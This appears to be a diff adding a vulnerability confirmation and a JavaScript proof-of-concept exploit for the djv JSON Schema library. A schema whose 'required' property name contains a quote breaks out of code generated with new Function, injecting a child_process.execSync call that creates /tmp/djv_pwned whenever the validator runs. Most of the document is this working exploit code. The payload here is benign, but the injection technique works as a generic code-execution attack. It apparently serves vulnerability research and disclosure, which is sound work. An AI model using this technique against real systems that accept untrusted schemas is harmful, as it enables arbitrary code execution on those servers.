@@ -1,0 +1,36 @@
+Confirmed: `djv` compiles JSON Schemas into JS validator functions using unsanitized string concatenation (property names go straight into a `new Function(...)` body), so a malicious schema achieves arbitrary code execution. Verified by creating `/tmp/djv_pwned` via injected `child_process.execSync`.
+
+```javascript
+'use strict';
+
+// djv (2.0.0) compiles JSON Schemas into JS validator functions using
+// new Function(...) with unsanitized string concatenation. A schema whose
+// "required" property name contains a double quote breaks out of the
+// generated string literal, letting an attacker inject arbitrary JS that
+// runs every time the compiled validator executes.
+
+const Djv = require('./node_modules/djv');
+
+const env = new Djv();
+
+// Malicious property name breaks out of the generated
+// `data.hasOwnProperty("<name>")` string and injects arbitrary code.
+const payload =
+  'a")); require("child_process").execSync("touch /tmp/djv_pwned"); ' +
+  'if(!data.hasOwnProperty("a';
+
+env.addSchema('evil', {
+  type: 'object',
+  properties: { a: { type: 'string' } },
+  required: [payload]
+});
+
+// Merely validating any object triggers the injected code.
+env.validate('evil', { a: 'x' });
+
+const fs = require('fs');
+console.log(
+  'Command injection via djv schema compilation executed:',
+  fs.existsSync('/tmp/djv_pwned')
+);
+```
